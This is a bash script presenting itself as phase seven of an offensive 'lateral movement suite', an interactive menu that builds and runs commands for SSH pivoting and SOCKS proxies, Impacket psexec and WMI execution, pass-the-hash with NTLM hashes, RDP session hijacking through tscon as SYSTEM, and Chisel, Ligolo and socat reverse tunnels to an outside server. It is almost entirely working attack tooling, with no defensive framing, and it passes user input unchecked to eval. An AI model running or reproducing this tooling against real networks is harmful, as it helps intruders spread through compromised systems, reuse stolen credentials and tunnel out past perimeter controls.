#!/bin/bash

#############################################################################
#                                                                           #
#  LATERAL MOVEMENT SUITE                                                  #
#  Phase 7: Move through the network                                        #
#                                                                           #
#  Includes:                                                               #
#  - SSH pivoting                                                          #
#  - RDP hijacking                                                         #
#  - WMI/psexec                                                            #
#  - Network tunneling                                                     #
#                                                                           #
#############################################################################

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

banner() {
    echo -e "${CYAN}"
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║              LATERAL MOVEMENT SUITE                                       ║
║              Phase 7: Move through the network                             ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

show_menu() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  LATERAL MOVEMENT${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}SSH Pivoting${NC}"
    echo "   L1.  SSH Local Port Forward"
    echo "   L2.  SSH Remote Port Forward"
    echo "   L3.  SSH Dynamic SOCKS Proxy"
    echo "   L4.  SSH Jump Host"
    echo ""
    echo -e "${YELLOW}Windows Lateral Movement${NC}"
    echo "   LW1. psexec"
    echo "   LW2. WMI Execution"
    echo "   LW3. Pass-the-Hash"
    echo "   LW4. RDP Hijacking"
    echo ""
    echo -e "${YELLOW}Tunneling & Proxies${NC}"
    echo "   LT1. Chisel Tunnel"
    echo "   LT2. Ligolo Proxy"
    echo "   LT3. Port Forwarding"
    echo "   LT4. Reverse Tunnels"
    echo ""
    echo -e "${RED}0. Exit to Main Menu${NC}"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_good() { echo -e "${GREEN}[+]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }

usage() {
    cat << EOF
USAGE: $0 [OPTIONS]

OPTIONS:
    L1                      SSH local port forward
    LW1                     psexec
    --menu                  Show interactive menu
    --help                  Show this help

EXAMPLES:
    $0 L1 target 8080
    $0 --menu

EOF
}

handle_selection() {
    local choice="$1"
    shift

    run_cmd() {
        local cmd="$1"
        echo -e "${GREEN}[>] Running: ${cmd}${NC}"
        eval "$cmd"
    }

    case "$choice" in
        L1|l1)
            echo -e "${BLUE}[*] SSH Local Port Forward${NC}"
            echo ""
            echo -n "[*] Enter jump host (user@ip): "
            read JUMP_HOST
            echo -n "[*] Enter target (ip:port): "
            read TARGET
            echo -n "[*] Enter local port: "
            read LOCAL_PORT
            echo ""
            if [[ -n "$JUMP_HOST" && -n "$TARGET" && -n "$LOCAL_PORT" ]]; then
                run_cmd "ssh -L ${LOCAL_PORT}:${TARGET} ${JUMP_HOST}"
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        L2|l2)
            echo -e "${BLUE}[*] SSH Remote Port Forward${NC}"
            echo ""
            echo -n "[*] Enter remote port: "
            read REMOTE_PORT
            echo -n "[*] Enter target (ip:port): "
            read TARGET
            echo -n "[*] Enter VPS server (user@ip): "
            read VPS
            echo ""
            if [[ -n "$REMOTE_PORT" && -n "$TARGET" && -n "$VPS" ]]; then
                run_cmd "ssh -R ${REMOTE_PORT}:${TARGET} ${VPS}"
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        L3|l3)
            echo -e "${BLUE}[*] SSH Dynamic SOCKS Proxy${NC}"
            echo ""
            echo -n "[*] Enter jump host (user@ip): "
            read JUMP_HOST
            echo -n "[*] Enter local proxy port [1080]: "
            read PROXY_PORT
            PROXY_PORT=${PROXY_PORT:-1080}
            echo ""
            if [[ -n "$JUMP_HOST" ]]; then
                run_cmd "ssh -D ${PROXY_PORT} ${JUMP_HOST}"
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        L4|l4)
            echo -e "${BLUE}[*] SSH Jump Host${NC}"
            echo ""
            echo -n "[*] Enter jump host (user@ip): "
            read JUMP_HOST
            echo -n "[*] Enter target host: "
            read TARGET_HOST
            echo ""
            if [[ -n "$JUMP_HOST" && -n "$TARGET_HOST" ]]; then
                run_cmd "ssh -J ${JUMP_HOST} ${TARGET_HOST}"
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        LW1)
            echo -e "${BLUE}[*] psexec (Impacket)${NC}"
            echo ""
            echo -n "[*] Enter target IP: "
            read TARGET
            echo -n "[*] Enter domain/user: "
            read DOMAIN_USER
            echo -n "[*] Enter password: "
            read -s PASSWORD
            echo ""
            echo ""
            if [[ -n "$TARGET" && -n "$DOMAIN_USER" ]]; then
                if command -v psexec.py &>/dev/null; then
                    run_cmd "psexec.py ${DOMAIN_USER}:${PASSWORD}@${TARGET}"
                else
                    echo -e "${YELLOW}[!] psexec.py not found. Install: pip3 install impacket${NC}"
                fi
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        LW2)
            echo -e "${BLUE}[*] WMI Execution${NC}"
            echo ""
            echo -n "[*] Enter target IP: "
            read TARGET
            echo -n "[*] Enter domain/user: "
            read DOMAIN_USER
            echo -n "[*] Enter password: "
            read -s PASSWORD
            echo ""
            echo ""
            if [[ -n "$TARGET" && -n "$DOMAIN_USER" ]]; then
                if command -v wmiexec.py &>/dev/null; then
                    run_cmd "wmiexec.py ${DOMAIN_USER}:${PASSWORD}@${TARGET}"
                elif command -v evil-winrm &>/dev/null; then
                    run_cmd "evil-winrm -i ${TARGET} -u ${DOMAIN_USER} -p ${PASSWORD}"
                else
                    echo -e "${YELLOW}[!] wmiexec.py or evil-winrm not found${NC}"
                fi
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        LW3)
            echo -e "${BLUE}[*] Pass-the-Hash${NC}"
            echo ""
            echo -n "[*] Enter target IP: "
            read TARGET
            echo -n "[*] Enter domain/user: "
            read DOMAIN_USER
            echo -n "[*] Enter NTLM hash: "
            read HASH
            echo ""
            if [[ -n "$TARGET" && -n "$DOMAIN_USER" && -n "$HASH" ]]; then
                if command -v pth-winexe &>/dev/null; then
                    run_cmd "pth-winexe -U ${DOMAIN_USER}%${HASH} //${TARGET} cmd"
                elif command -v impacket-psexec &>/dev/null; then
                    run_cmd "impacket-psexec -hashes :${HASH} ${DOMAIN_USER}@${TARGET}"
                else
                    echo -e "${YELLOW}[!] pth-winexe or impacket-psexec not found${NC}"
                fi
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        LW4)
            echo -e "${BLUE}[*] RDP Hijacking${NC}"
            echo ""
            echo "[*] Note: Requires SYSTEM access on Windows"
            echo ""
            echo -n "[*] Enter session ID: "
            read SESSION_ID
            echo -n "[*] Enter session name: "
            read SESSION_NAME
            echo ""
            if [[ -n "$SESSION_ID" && -n "$SESSION_NAME" ]]; then
                echo -e "${GREEN}[>] Running: tscon ${SESSION_ID} /dest:${SESSION_NAME}${NC}"
                echo -e "${YELLOW}[!] Run as SYSTEM: psexec -s tscon ${SESSION_ID} /dest:${SESSION_NAME}${NC}"
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        LT1)
            echo -e "${BLUE}[*] Chisel Tunnel${NC}"
            echo ""
            echo "[*] 1. Start Chisel Server"
            echo "[*] 2. Connect Chisel Client"
            echo ""
            echo -n "[*] Choice: "
            read CHISEL_CHOICE
            echo ""
            if [[ "$CHISEL_CHOICE" == "1" ]]; then
                echo -n "[*] Enter listen port [8080]: "
                read PORT
                PORT=${PORT:-8080}
                if command -v chisel &>/dev/null; then
                    run_cmd "chisel server --reverse --port ${PORT}"
                else
                    echo -e "${YELLOW}[!] chisel not found. Download: https://github.com/jpillora/chisel${NC}"
                fi
            elif [[ "$CHISEL_CHOICE" == "2" ]]; then
                echo -n "[*] Enter server (ip:port): "
                read SERVER
                echo -n "[*] Enter target (ip:port): "
                read TARGET
                echo -n "[*] Enter local port: "
                read LOCAL_PORT
                echo ""
                if [[ -n "$SERVER" && -n "$TARGET" ]]; then
                    if command -v chisel &>/dev/null; then
                        run_cmd "chisel client ${SERVER} R:${LOCAL_PORT}:${TARGET}"
                    else
                        echo -e "${YELLOW}[!] chisel not found${NC}"
                    fi
                else
                    echo -e "${YELLOW}[!] Missing required parameters${NC}"
                fi
            fi
            ;;
        LT2)
            echo -e "${BLUE}[*] Ligolo Proxy${NC}"
            echo ""
            echo "[*] Ligolo-ng is a tunneling tool."
            echo "[*] Download: https://github.com/nicocha30/ligolo-ng"
            echo ""
            echo "[*] 1. Start Proxy Server"
            echo "[*] 2. Connect Agent"
            echo ""
            echo -n "[*] Choice: "
            read LIGOLO_CHOICE
            echo ""
            if [[ "$LIGOLO_CHOICE" == "1" ]]; then
                echo -n "[*] Enter listen port [11601]: "
                read PORT
                PORT=${PORT:-11601}
                echo -e "${GREEN}[>] Running: ./proxy -selfcert -laddr 0.0.0.0:${PORT}${NC}"
                echo -e "${YELLOW}[!] Ensure agent binary is available${NC}"
            elif [[ "$LIGOLO_CHOICE" == "2" ]]; then
                echo -n "[*] Enter relay server (ip:port): "
                read SERVER
                if [[ -n "$SERVER" ]]; then
                    echo -e "${GREEN}[>] Running: ./agent -relayserver ${SERVER}${NC}"
                fi
            fi
            ;;
        LT3)
            echo -e "${BLUE}[*] Port Forwarding${NC}"
            echo ""
            echo "[*] 1. SSH Local Port Forward"
            echo "[*] 2. Socat Port Forward"
            echo ""
            echo -n "[*] Choice: "
            read PF_CHOICE
            echo ""
            if [[ "$PF_CHOICE" == "1" ]]; then
                echo -n "[*] Enter jump host (user@ip): "
                read JUMP_HOST
                echo -n "[*] Enter target (ip:port): "
                read TARGET
                echo -n "[*] Enter local port: "
                read LOCAL_PORT
                echo ""
                if [[ -n "$JUMP_HOST" && -n "$TARGET" && -n "$LOCAL_PORT" ]]; then
                    run_cmd "ssh -L ${LOCAL_PORT}:${TARGET} ${JUMP_HOST}"
                fi
            elif [[ "$PF_CHOICE" == "2" ]]; then
                echo -n "[*] Enter listen port: "
                read LISTEN_PORT
                echo -n "[*] Enter target (ip:port): "
                read TARGET
                echo ""
                if [[ -n "$LISTEN_PORT" && -n "$TARGET" ]]; then
                    if command -v socat &>/dev/null; then
                        run_cmd "socat TCP-LISTEN:${LISTEN_PORT},fork TCP:${TARGET}"
                    else
                        echo -e "${YELLOW}[!] socat not found${NC}"
                    fi
                fi
            fi
            ;;
        LT4)
            echo -e "${BLUE}[*] Reverse Tunnels${NC}"
            echo ""
            echo -n "[*] Enter remote port: "
            read REMOTE_PORT
            echo -n "[*] Enter local port: "
            read LOCAL_PORT
            echo -n "[*] Enter remote server (user@ip): "
            read SERVER
            echo ""
            if [[ -n "$REMOTE_PORT" && -n "$LOCAL_PORT" && -n "$SERVER" ]]; then
                run_cmd "ssh -R ${REMOTE_PORT}:localhost:${LOCAL_PORT} ${SERVER}"
            else
                echo -e "${YELLOW}[!] Missing required parameters${NC}"
            fi
            ;;
        --menu)
            banner
            show_menu
            read -p "Enter choice: " choice
            handle_selection "$choice"
            ;;
        --help|-h)
            usage
            ;;
        *)
            log_warn "Invalid choice: $choice"
            usage
            ;;
    esac
}

main() {
    if [[ $# -gt 0 ]]; then
        handle_selection "$@"
        exit 0
    fi
    
    while true; do
        banner
        show_menu
        
        echo ""
        read -p "Enter choice: " choice
        
        if [[ "$choice" == "0" ]]; then
            echo -e "${GREEN}Returning to main menu...${NC}"
            exit 0
        fi
        
        handle_selection "$choice"
        
        echo ""
        read -p "Press Enter to continue..."
    done
}

main "$@"
